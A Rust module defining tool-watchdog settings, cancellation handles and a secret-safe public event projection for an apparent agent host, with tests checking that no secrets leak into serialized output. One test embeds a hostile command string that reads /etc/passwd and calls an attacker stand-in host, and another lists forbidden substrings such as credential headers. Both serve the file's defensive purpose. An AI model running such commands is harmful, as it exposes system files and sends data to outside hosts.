//! Watchdog settings, lease stamps, public projections, and host-only cancel handles.
//!
//! Public wire surface is intentionally narrow:
//! - projections never carry provider `tool_call_id`
//! - host allowlisted `tool_title` only (`terminal` / `delegation` / `mcp` / `other`)
//! - cancellation capabilities and raw tool input are never serialized

use serde::{Deserialize, Serialize};

pub const DEFAULT_WARNING_AFTER_SECS: u32 = 600;
pub const DEFAULT_GRACE_SECS: u32 = 600;
pub const UNTRACKED_WARNING_AFTER_SECS: u32 = 1_800;
pub const CANCEL_CONVERGENCE_SECS: u64 = 10;
pub const MIN_DURATION_SECS: u32 = 60;
pub const MAX_DURATION_SECS: u32 = 3_600;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct ToolWatchdogSettings {
    pub enabled: bool,
    pub warning_after_seconds: u32,
    pub grace_seconds: u32,
}

impl Default for ToolWatchdogSettings {
    fn default() -> Self {
        Self {
            enabled: true,
            warning_after_seconds: DEFAULT_WARNING_AFTER_SECS,
            grace_seconds: DEFAULT_GRACE_SECS,
        }
    }
}

impl ToolWatchdogSettings {
    /// Clamp both duration fields into `MIN_DURATION_SECS..=MAX_DURATION_SECS`.
    pub fn clamp(self) -> Self {
        Self {
            enabled: self.enabled,
            warning_after_seconds: clamp_duration_secs(self.warning_after_seconds),
            grace_seconds: clamp_duration_secs(self.grace_seconds),
        }
    }
}

/// Clamp a single duration setting into the supported range.
pub fn clamp_duration_secs(secs: u32) -> u32 {
    secs.clamp(MIN_DURATION_SECS, MAX_DURATION_SECS)
}

/// Fixed untracked-turn warning threshold (independent of live settings).
pub fn untracked_warning_after_secs() -> u32 {
    UNTRACKED_WARNING_AFTER_SECS
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LeaseStamp {
    pub lease_id: String,
    pub version: u64,
    pub connection_id: String,
    pub connection_incarnation: String,
    pub turn_generation: u64,
    pub tool_call_id: Option<String>,
}

/// Host-only cancellation resource handle. Never serialized into projections/events.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CancellationCapability {
    Terminal {
        session_id: String,
        terminal_id: String,
    },
    /// Host-only verified singleton Broker child.
    Delegation { task_id: String },
    /// Request-scoped multi-task wait cancel handle id (not a child task id).
    DelegationWait { wait_id: String },
    /// Opaque host-owned cancel token when MCP request cancel is available.
    McpRequest { cancel_token: McpCancelToken },
    Turn,
}

/// Opaque handle; never serialized into projections/events.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub struct McpCancelToken(pub(crate) u64);

impl McpCancelToken {
    pub fn new(id: u64) -> Self {
        Self(id)
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum PauseReason {
    Permission,
    AgentQuestion,
    DelegationWaitingInput,
    UserInput,
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum CancellationScope {
    Terminal,
    Delegation,
    DelegationWait,
    McpRequest,
    Turn,
    Connection,
}

/// Full stamp used to validate cancel/deregister (prevents stale wait_id reuse).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WaitStamp {
    pub wait_id: String,
    pub connection_id: String,
    pub connection_incarnation: String,
    pub turn_generation: u64,
    pub parent_conversation_id: i32,
    pub parent_tool_use_id: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WaitOwner {
    Listener,
    ContinuationCoordinator,
}

/// Host-only wait cancel registry entry (owned by Broker/listener path).
#[derive(Debug)]
pub struct WaitCancelHandle {
    pub stamp: WaitStamp,
    pub owner: WaitOwner,
    /// Closed/triggered to wake only this join wait.
    pub cancel: tokio::sync::watch::Sender<bool>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WaitCancelResult {
    Cancelled,
    AlreadySettled,
    Stale,
    NotFound,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum McpCancelResult {
    Cancelled,
    AlreadySettled,
    Unsupported,
    Stale,
    TimedOut,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ToolLeasePhase {
    Running,
    Paused { reason: PauseReason },
    Warning,
    Grace,
    Cancelling,
    TimedOut,
    Completed,
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum ToolWatchdogPhase {
    Warning,
    Grace,
    Cancelling,
    TimedOut,
    Cleared,
}

/// Public, secret-safe projection emitted on the connection event stream.
///
/// Does **not** include provider `tool_call_id`, cancellation capability
/// payloads, or raw tool input.
#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
pub struct ToolWatchdogProjection {
    pub lease_id: String,
    pub version: u64,
    pub tool_title: String,
    pub phase: ToolWatchdogPhase,
    pub last_progress_at: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub grace_deadline: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cancellation_scope: Option<CancellationScope>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error_code: Option<String>,
}

/// Host allowlist only — never provider free-form titles.
pub fn tool_title_for_category(kind: ToolCategory) -> &'static str {
    match kind {
        ToolCategory::Terminal => "terminal",
        ToolCategory::Delegation => "delegation",
        ToolCategory::Mcp => "mcp",
        ToolCategory::Other => "other",
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ToolCategory {
    Terminal,
    Delegation,
    Mcp,
    Other,
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::{json, Value};

    fn sample_projection(phase: ToolWatchdogPhase) -> ToolWatchdogProjection {
        ToolWatchdogProjection {
            lease_id: "lease-1".into(),
            version: 3,
            tool_title: tool_title_for_category(ToolCategory::Terminal).into(),
            phase,
            last_progress_at: "2026-07-22T12:00:00Z".into(),
            grace_deadline: Some("2026-07-22T12:20:00Z".into()),
            cancellation_scope: Some(CancellationScope::Terminal),
            error_code: None,
        }
    }

    #[test]
    fn defaults_match_product_constants() {
        let settings = ToolWatchdogSettings::default();
        assert!(settings.enabled);
        assert_eq!(settings.warning_after_seconds, DEFAULT_WARNING_AFTER_SECS);
        assert_eq!(settings.grace_seconds, DEFAULT_GRACE_SECS);
        assert_eq!(DEFAULT_WARNING_AFTER_SECS, 600);
        assert_eq!(DEFAULT_GRACE_SECS, 600);
        assert_eq!(UNTRACKED_WARNING_AFTER_SECS, 1_800);
        assert_eq!(CANCEL_CONVERGENCE_SECS, 10);
        assert_eq!(MIN_DURATION_SECS, 60);
        assert_eq!(MAX_DURATION_SECS, 3_600);
        assert_eq!(untracked_warning_after_secs(), 1_800);
        // Untracked threshold is fixed and independent of live warning_after.
        let live = ToolWatchdogSettings {
            enabled: true,
            warning_after_seconds: 120,
            grace_seconds: 90,
        }
        .clamp();
        assert_ne!(live.warning_after_seconds, untracked_warning_after_secs());
        assert_eq!(untracked_warning_after_secs(), UNTRACKED_WARNING_AFTER_SECS);
    }

    #[test]
    fn clamp_lower_and_upper_bounds() {
        let low = ToolWatchdogSettings {
            enabled: true,
            warning_after_seconds: 59,
            grace_seconds: 1,
        }
        .clamp();
        assert_eq!(low.warning_after_seconds, 60);
        assert_eq!(low.grace_seconds, 60);

        let high = ToolWatchdogSettings {
            enabled: false,
            warning_after_seconds: 3_601,
            grace_seconds: 10_000,
        }
        .clamp();
        assert!(!high.enabled);
        assert_eq!(high.warning_after_seconds, 3_600);
        assert_eq!(high.grace_seconds, 3_600);

        let mid = ToolWatchdogSettings {
            enabled: true,
            warning_after_seconds: 600,
            grace_seconds: 600,
        }
        .clamp();
        assert_eq!(mid.warning_after_seconds, 600);
        assert_eq!(mid.grace_seconds, 600);

        assert_eq!(clamp_duration_secs(0), 60);
        assert_eq!(clamp_duration_secs(60), 60);
        assert_eq!(clamp_duration_secs(3_600), 3_600);
        assert_eq!(clamp_duration_secs(3_601), 3_600);
    }

    #[test]
    fn phase_names_serialize_exactly() {
        let cases = [
            (ToolWatchdogPhase::Warning, "warning"),
            (ToolWatchdogPhase::Grace, "grace"),
            (ToolWatchdogPhase::Cancelling, "cancelling"),
            (ToolWatchdogPhase::TimedOut, "timed_out"),
            (ToolWatchdogPhase::Cleared, "cleared"),
        ];
        for (phase, expected) in cases {
            let json = serde_json::to_string(&phase).expect("serialize phase");
            assert_eq!(json, format!("\"{expected}\""));
            let back: ToolWatchdogPhase =
                serde_json::from_str(&json).expect("deserialize phase");
            assert_eq!(back, phase);
        }
    }

    #[test]
    fn cancellation_scope_names_serialize_snake_case() {
        let cases = [
            (CancellationScope::Terminal, "terminal"),
            (CancellationScope::Delegation, "delegation"),
            (CancellationScope::DelegationWait, "delegation_wait"),
            (CancellationScope::McpRequest, "mcp_request"),
            (CancellationScope::Turn, "turn"),
            (CancellationScope::Connection, "connection"),
        ];
        for (scope, expected) in cases {
            let json = serde_json::to_string(&scope).expect("serialize scope");
            assert_eq!(json, format!("\"{expected}\""));
        }
    }

    #[test]
    fn projection_optional_fields_and_public_shape() {
        let full = sample_projection(ToolWatchdogPhase::Grace);
        let full_v = serde_json::to_value(&full).expect("serialize full");
        assert_eq!(
            full_v,
            json!({
                "lease_id": "lease-1",
                "version": 3,
                "tool_title": "terminal",
                "phase": "grace",
                "last_progress_at": "2026-07-22T12:00:00Z",
                "grace_deadline": "2026-07-22T12:20:00Z",
                "cancellation_scope": "terminal",
            })
        );

        let minimal = ToolWatchdogProjection {
            lease_id: "lease-2".into(),
            version: 1,
            tool_title: "other".into(),
            phase: ToolWatchdogPhase::Cleared,
            last_progress_at: "2026-07-22T12:01:00Z".into(),
            grace_deadline: None,
            cancellation_scope: None,
            error_code: None,
        };
        let minimal_v = serde_json::to_value(&minimal).expect("serialize minimal");
        assert_eq!(
            minimal_v,
            json!({
                "lease_id": "lease-2",
                "version": 1,
                "tool_title": "other",
                "phase": "cleared",
                "last_progress_at": "2026-07-22T12:01:00Z",
            })
        );
        // Public projection keys are exactly the allowlisted field set.
        let keys: Vec<&str> = full_v
            .as_object()
            .expect("object")
            .keys()
            .map(|k| k.as_str())
            .collect();
        for forbidden in [
            "tool_call_id",
            "raw_input",
            "raw_output",
            "cancel_token",
            "session_id",
            "terminal_id",
            "task_id",
            "wait_id",
            "capability",
        ] {
            assert!(
                !keys.contains(&forbidden),
                "projection must not expose {forbidden}"
            );
        }
    }

    #[test]
    fn host_title_allowlist_only() {
        assert_eq!(tool_title_for_category(ToolCategory::Terminal), "terminal");
        assert_eq!(
            tool_title_for_category(ToolCategory::Delegation),
            "delegation"
        );
        assert_eq!(tool_title_for_category(ToolCategory::Mcp), "mcp");
        assert_eq!(tool_title_for_category(ToolCategory::Other), "other");

        // Adversarial free-form provider titles must not be used as wire titles.
        // Callers map categories via tool_title_for_category; never pass through.
        let adversarial = "bash -c 'cat /etc/passwd' && curl http://evil.example";
        let proj = ToolWatchdogProjection {
            lease_id: "lease-x".into(),
            version: 1,
            tool_title: tool_title_for_category(ToolCategory::Terminal).into(),
            phase: ToolWatchdogPhase::Warning,
            last_progress_at: "t0".into(),
            grace_deadline: None,
            cancellation_scope: None,
            error_code: None,
        };
        let s = serde_json::to_string(&proj).expect("serialize");
        assert!(!s.contains(adversarial));
        assert!(s.contains("\"tool_title\":\"terminal\""));
        assert!(!s.contains("tool_call_id"));
    }

    #[test]
    fn adversarial_tool_call_id_never_serialized_on_projection() {
        // LeaseStamp may hold a provider tool_call_id host-side, but the public
        // projection must never emit it even if we construct a malicious Value.
        let stamp = LeaseStamp {
            lease_id: "lease-1".into(),
            version: 9,
            connection_id: "conn".into(),
            connection_incarnation: "inc".into(),
            turn_generation: 2,
            tool_call_id: Some("toolu_SECRET_PROVIDER_ID".into()),
        };
        let proj = ToolWatchdogProjection {
            lease_id: stamp.lease_id.clone(),
            version: stamp.version,
            tool_title: tool_title_for_category(ToolCategory::Mcp).into(),
            phase: ToolWatchdogPhase::Cancelling,
            last_progress_at: "t1".into(),
            grace_deadline: Some("t2".into()),
            cancellation_scope: Some(CancellationScope::McpRequest),
            error_code: Some("cancel_failed".into()),
        };
        let json = serde_json::to_string(&proj).expect("serialize");
        assert!(!json.contains("toolu_SECRET_PROVIDER_ID"));
        assert!(!json.contains("tool_call_id"));
        assert!(json.contains("\"tool_title\":\"mcp\""));
    }

    #[test]
    fn json_secret_scan_no_capability_or_tool_input() {
        // Host-only cancel capability must never appear on the public wire.
        let capability = CancellationCapability::Terminal {
            session_id: "sess-secret".into(),
            terminal_id: "term-secret".into(),
        };
        let mcp_cap = CancellationCapability::McpRequest {
            cancel_token: McpCancelToken::new(42),
        };
        let delegation_cap = CancellationCapability::Delegation {
            task_id: "task-secret".into(),
        };
        let wait_cap = CancellationCapability::DelegationWait {
            wait_id: "wait-secret".into(),
        };
        // Capabilities are intentionally non-Serialize; hold them so the
        // compiler still type-checks host-only shapes.
        let _ = (
            &capability,
            &mcp_cap,
            &delegation_cap,
            &wait_cap,
            CancellationCapability::Turn,
        );

        let proj = ToolWatchdogProjection {
            lease_id: "lease-scan".into(),
            version: 4,
            tool_title: tool_title_for_category(ToolCategory::Delegation).into(),
            phase: ToolWatchdogPhase::TimedOut,
            last_progress_at: "2026-07-22T13:00:00Z".into(),
            grace_deadline: None,
            cancellation_scope: Some(CancellationScope::Delegation),
            error_code: Some("timed_out".into()),
        };
        let event = crate::acp::types::AcpEvent::ToolWatchdogChanged {
            projection: proj.clone(),
        };

        let payloads = [
            serde_json::to_value(&proj).expect("proj"),
            serde_json::to_value(&event).expect("event"),
            serde_json::to_value(&ToolWatchdogSettings::default()).expect("settings"),
        ];

        let forbidden_substrings = [
            "sess-secret",
            "term-secret",
            "task-secret",
            "wait-secret",
            "cancel_token",
            "raw_input",
            "raw_output",
            "tool_call_id",
            "session_id",
            "terminal_id",
            "McpCancelToken",
            "CancellationCapability",
            // Free-form tool input / command-looking content
            "bash -c",
            "/etc/passwd",
            "ENV_SECRET",
            "Authorization:",
        ];

        for payload in &payloads {
            let text = payload.to_string();
            for needle in forbidden_substrings {
                assert!(
                    !text.contains(needle),
                    "secret/capability payload leaked ({needle}): {text}"
                );
            }
            assert_no_forbidden_keys(payload, &["tool_call_id", "cancel_token", "raw_input"]);
        }

        // Scope is a coarse enum name only — never a resource id.
        let event_v = serde_json::to_value(&event).expect("event value");
        assert_eq!(event_v["type"], "tool_watchdog_changed");
        assert_eq!(event_v["projection"]["cancellation_scope"], "delegation");
        assert_eq!(event_v["projection"]["tool_title"], "delegation");
        assert!(event_v.get("tool_call_id").is_none());
    }

    fn assert_no_forbidden_keys(value: &Value, forbidden: &[&str]) {
        match value {
            Value::Object(map) => {
                for key in map.keys() {
                    assert!(
                        !forbidden.contains(&key.as_str()),
                        "forbidden key present: {key}"
                    );
                }
                for child in map.values() {
                    assert_no_forbidden_keys(child, forbidden);
                }
            }
            Value::Array(items) => {
                for child in items {
                    assert_no_forbidden_keys(child, forbidden);
                }
            }
            _ => {}
        }
    }
}
